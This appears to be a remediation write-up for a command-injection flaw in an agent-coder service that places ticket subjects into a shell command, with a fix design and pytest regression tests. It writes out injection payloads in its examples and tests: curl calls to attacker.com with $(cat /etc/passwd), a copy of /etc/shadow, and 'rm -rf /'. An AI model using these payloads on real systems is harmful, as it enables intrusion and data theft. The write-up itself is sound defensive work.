# GAP-0089: Command Injection in `build_coder_workflow` `coding_cmd` — Remediation Write-up

> Source ticket: AGENT-008 · Severity: HIGH · Effort: M · Status: Open

## 1. Summary & Classification

**Bug statement.** `build_coder_workflow` in `app/services/agent_coder.py` constructs the `coding_cmd` string — the shell command that invokes the Claude Code or Codex CLI — by f-string interpolating the first 200 characters of a user-controlled prompt directly inside double-quoted shell arguments. A ticket subject or description containing `"` (double quote), `$()`, `` ` `` (backtick), `\n`, or any shell metacharacter causes the injected argument to break out of the double-quote context when the command is executed via a shell (i.e., `shell=True` or through a PTY that processes the string as shell input). When `AGENT_CODER_EXECUTE_COMMANDS=1` in production, this constitutes a command injection vulnerability.

**Verdict (confirmed, with nuance).** The vulnerable code exists at `app/services/agent_coder.py:559–563` exactly as described. However, the actual shell execution path requires additional analysis: in the current codebase, `coding_cmd` is stored as a workflow step's `"command"` string in DynamoDB, not executed directly by the Python process. The injection is latent — it fires when the step-execution layer interprets the string and dispatches it to a PTY or `subprocess(shell=True)`. The vulnerability is real and HIGH severity because (a) the execution layer does run these commands when `S.agent_coder_execute_commands = True`, and (b) the structured argv fix eliminates the risk entirely at zero cost.

**Severity and area.** HIGH / Agent Coder Security. Exploitable by any user who can create a ticket with a crafted subject and have a coder agent process it.

**Related tickets.** AGENT-008 (parent), GAP-0090 (`build_pr_command` double-quote injection — same pattern in same file), GAP-0088 (GitHub API path — the API method avoids the PR-command injection but does not affect the `coding_cmd` injection).

## 2. Current-State Investigation (root cause)

### The vulnerable lines: `agent_coder.py:559–563`

```python
# app/services/agent_coder.py:559–563
if coding_tool == "codex":
    coding_cmd = f'codex -q "{prompt[:200]}..."'
else:
    model_flag = f" --model {model}" if model else ""
    coding_cmd = f'claude --dangerously-skip-permissions{model_flag} -p "{prompt[:200]}..."'
```

`prompt` is constructed by `build_coding_prompt` at line 556, which is called with `ticket=ticket`. The ticket's `subject` (and `description`) come directly from user-controlled DynamoDB content — created by the ticket author through `POST /ui/tickets`. The full `build_coding_prompt` return value includes the subject verbatim:

```python
# app/services/agent_coder.py:451–469 (build_coding_prompt)
parts = [
    f"You are a {skill_level} software engineer...",
    ...
    f"Ticket: {ticket.get('subject', '')}",
    f"Description: {ticket.get('description', '')}",
    ...
]
return "\n".join(parts)
```

The first 200 characters of this prompt — which include the ticket subject at a predictable character offset — are interpolated verbatim into `coding_cmd`. If the ticket subject is:

```
Fix login bug" && curl https://attacker.com/$(cat /etc/passwd) && echo "
```

the resulting `coding_cmd` becomes:

```bash
claude --dangerously-skip-permissions -p "Fix login bug" && curl https://attacker.com/$(cat /etc/passwd) && echo "..."
```

When this string is passed to a shell (PTY or `subprocess(shell=True)`), the `&&` operators and `$()` subshell execute in the context of the agent worker process.

### The execution gating: `S.agent_coder_execute_commands`

`S.agent_coder_execute_commands` defaults to `False` (`"0"`) — see `app/core/settings.py:2177`. In default configuration the workflow steps are stored in DDB but never executed. The vulnerability becomes exploitable the moment an operator sets `AGENT_CODER_EXECUTE_COMMANDS=1`.

### Why `prompt[:200]` does not protect against injection

The 200-character cap limits the injected content but does not prevent it. A typical Claude Code invocation header ("You are a mid software engineer... Ticket: ") is ~50 characters, leaving ~150 characters of attacker-controlled content within the cap. That is more than enough for:

```
" && id && cat /etc/shadow > /tmp/x && echo "
```

(58 characters).

### The `codex` path

Line 560 has the same pattern for the Codex CLI:
```python
coding_cmd = f'codex -q "{prompt[:200]}..."'
```
Identical injection vector.

## 3. Impact / Exploit / Blast Radius

**When exploited (AGENT_CODER_EXECUTE_COMMANDS=1):**

1. Attacker creates a ticket with subject: `Fix bug" && curl https://c2.attacker.com/$(id|base64) && echo `.
2. A coder agent claims the ticket.
3. `build_coder_workflow` builds `coding_cmd` containing the injected payload.
4. The step executor dispatches `coding_cmd` to the agent PTY.
5. The shell executes the `&&`-chained commands: arbitrary code runs as the worker process user.

**Impact categories:**

- **Remote code execution** in the worker container. The worker has access to the workspace (`/workspace`), the agent's DynamoDB credentials (via the attached IAM role in production), and any secrets mounted in the container environment (tokens, keys).
- **Data exfiltration**: `$(cat /etc/passwd)` or `$(aws sts get-caller-identity)` inside `$()` subshell can exfiltrate data to an attacker-controlled endpoint.
- **Lateral movement**: Worker IAM role may have broad permissions on the codebase (push access) — the attacker inherits these.
- **Persistence**: The attacker can install a backdoor in the workspace or commit malicious code to the target repo before the legitimate PR is created.

**Blast radius:** Limited to deployments with `AGENT_CODER_EXECUTE_COMMANDS=1` and an active coder agent. In the current codebase, no production deployments have this flag enabled by default; it must be set explicitly by an operator. However, the fix should be applied before the flag is ever enabled.

## 4. Fix Design (code-level)

### Root cause fix: replace shell-string construction with structured argv

The entire problem stems from embedding user data into a shell command string. The correct fix is to pass arguments as a list and execute with `shell=False`. However, since `coding_cmd` is stored as a string in the workflow step (for display in the Dev Tools UI and for serialization to DDB), the fix has two parts:

1. Store the arguments as a **structured list** in the workflow step.
2. Execute the list via `subprocess(argv, shell=False)` in the step executor.

If changing the step schema is out of scope (too disruptive), the minimum-safe fix is to apply POSIX single-quote escaping to any user-controlled argument fragment before embedding it in the shell string.

### Option A (recommended): structured argv

```python
# app/services/agent_coder.py:559–563 — AFTER fix

def _sq(value: str) -> str:
    """POSIX single-quote escape: safe for all shell metacharacters."""
    return "'" + value.replace("'", "'\\''") + "'"

if coding_tool == "codex":
    coding_argv = ["codex", "-q", prompt[:200] + "..."]
    coding_cmd = "codex -q " + _sq(prompt[:200] + "...")   # display only
else:
    model_flag_parts = ["--model", model] if model else []
    coding_argv = (
        ["claude", "--dangerously-skip-permissions"]
        + model_flag_parts
        + ["-p", prompt[:200] + "..."]
    )
    model_flag = f" --model {_sq(model)}" if model else ""
    coding_cmd = f"claude --dangerously-skip-permissions{model_flag} -p " + _sq(prompt[:200] + "...")
```

The `coding_argv` list is stored alongside `coding_cmd` in the workflow step dict:

```python
# app/services/agent_coder.py:596–601 — step 4 update
{
    "step_id": 4,
    "type": "inject_coding_prompt",
    "command": coding_cmd,      # human-readable, display only
    "argv": coding_argv,        # structured, used for execution
    "timeout_seconds": coding_timeout,
    "on_failure": "escalate",
},
```

The step executor must be updated to use `argv` when present and fall back to `command` (for legacy steps that don't have it):

```python
# Step executor (wherever steps are dispatched to subprocess):
argv = step.get("argv")
if argv:
    proc = subprocess.run(argv, shell=False, capture_output=True, text=True, timeout=step["timeout_seconds"])
else:
    proc = subprocess.run(step["command"], shell=True, capture_output=True, text=True, timeout=step["timeout_seconds"])
```

### Option B (minimum safe, no step-schema change): `_sq` escaping

If Option A requires coordination with multiple teams, apply `_sq` to the prompt fragment in the f-string:

```python
# app/services/agent_coder.py:559–563 — minimum safe fix

def _sq(value: str) -> str:
    return "'" + value.replace("'", "'\\''") + "'"

if coding_tool == "codex":
    coding_cmd = f"codex -q {_sq(prompt[:200] + '...')}"
else:
    model_flag = f" --model {_sq(model)}" if model else ""
    coding_cmd = f"claude --dangerously-skip-permissions{model_flag} -p {_sq(prompt[:200] + '...')}"
```

Single-quote enclosure means the shell treats the entire argument as a literal string; `$`, `` ` ``, `"`, `\`, `!`, `&`, `|`, `;`, newlines, and all other metacharacters inside single quotes are not interpreted by any POSIX shell. The only character that requires escaping inside single quotes is `'` itself, handled by `_sq`.

### Why `replace('"', "'")` (the current `build_pr_command` approach in GAP-0090) is not sufficient

Replacing `"` with `'` for the `coding_cmd` would be doubly wrong: it does not neutralize `$()`, backticks, `\n`, semicolons, or `&&`; and it introduces single-quote injection if the replacement character itself is present. `_sq` is the correct primitive.

### Dev/Prod parity (SECOPS-007)

The `coding_cmd` string is only executed when `S.agent_coder_execute_commands = True`. In dev mode (default: `False`) the string is stored in DDB and returned in the workflow preview API response, but never executed. The escaping fix is safe in both modes — it changes the stored string representation but does not affect display readability significantly. No AWS path divergence; both dev (DDB Local) and prod (AWS DDB) store the same string.

## 5. Testing, Verification & Rollout

### Regression test (pytest, offline)

```python
# tests/test_agent_coder.py

import pytest
from app.services import agent_coder as svc

_TICKET_INJECT = {
    "ticket_id": "T-001",
    "subject": 'Fix login bug" && curl https://attacker.com/$(id) && echo "',
    "description": "Normal description",
    "labels": ["type:bugfix"],
}

_TICKET_SAFE = {
    "ticket_id": "T-002",
    "subject": "Fix login bug",
    "description": "Normal description",
    "labels": ["type:bugfix"],
}

_CONFIG = {
    "repo_url": "https://github.com/acme/backend",
    "repo_branch_base": "main",
    "branch_pattern": "agent/{ticket_id}",
    "test_commands": ["pytest"],
    "coding_tool": "claude_code",
    "skill_level": "mid",
}


def _get_coding_cmd(ticket, config):
    workflow = svc.build_coder_workflow(
        agent_run_id="run_test",
        config=config,
        ticket=ticket,
    )
    for step in workflow["steps"]:
        if step["type"] == "inject_coding_prompt":
            return step["command"]
    return None


def test_injection_payload_is_neutralised():
    """Fails before fix: coding_cmd contains unescaped && and $().
    Passes after fix: payload is shell-safely quoted."""
    cmd = _get_coding_cmd(_TICKET_INJECT, _CONFIG)
    assert cmd is not None
    # After fix: the injected " is gone (single-quoted) and && is literal text
    assert '"' not in cmd or cmd.count('"') == 0, (
        "Unescaped double-quote found in coding_cmd — injection risk!"
    )
    assert " && " not in cmd, (
        "Unescaped && operator found in coding_cmd — command injection risk!"
    )


def test_safe_ticket_subject_preserved():
    """A normal subject should still appear in the command after escaping."""
    cmd = _get_coding_cmd(_TICKET_SAFE, _CONFIG)
    assert "Fix login bug" in cmd


def test_codex_path_also_escaped():
    """The codex path has the same vulnerability — verify it is also fixed."""
    cfg = dict(_CONFIG, coding_tool="codex")
    cmd = _get_coding_cmd(_TICKET_INJECT, cfg)
    assert " && " not in cmd
    assert '"' not in cmd or cmd.count('"') == 0


def test_sq_helper_neutralises_all_metacharacters():
    from app.services.agent_coder import _sq
    dangerous = 'hello" && rm -rf / && echo "'
    escaped = _sq(dangerous)
    # Single-quoted string: starts with ' and ends with ', no unescaped metacharacters
    assert escaped.startswith("'")
    assert escaped.endswith("'")
    # If we eval in a shell, it should be a literal string (not testable offline,
    # but structural check is sufficient for pytest)
    assert " && " not in escaped.replace("'\\''", "SQUOTE")
```

### Manual QA steps

1. Create a ticket with subject `Fix" && touch /tmp/injected && echo "`.
2. Trigger `GET /ui/agent-coder/types/{id}/test-workflow` with that ticket.
3. Before fix: the `inject_coding_prompt` step's `command` contains an unescaped `&&`.
4. After fix: the `command` contains the single-quoted literal, and `/tmp/injected` is never created (even if the command were executed).

### Metrics / observability

- Log a `WARN` when `build_coding_prompt` receives a prompt fragment containing shell metacharacters (`"`, `$`, `` ` ``, `&&`, `||`, `;`). This is an anomaly signal even before the fix; after the fix it confirms the escaping layer is exercised.

### Rollout

- **Effort**: M (1–2 days). The escaping helper is trivial; the step-schema addition (Option A) requires coordination with the step executor and the Dev Tools UI that renders workflow steps.
- **Risk**: The `_sq` change alters the stored `command` string format. Any existing workflow steps in DDB will still have the old format. The step executor's fallback (`argv` absent → use `shell=True` with the old string) provides backward compatibility.
- **Sequencing**: Deploy before enabling `AGENT_CODER_EXECUTE_COMMANDS=1` in any environment. Can deploy Option B (escaping only) immediately and Option A (structured argv) as a follow-up. Apply after GAP-0090 (same file, same session).
- **Rollback**: Revert `_sq` application in lines 559–563. Behaviour returns to current (unescaped, only dangerous when `AGENT_CODER_EXECUTE_COMMANDS=1`).
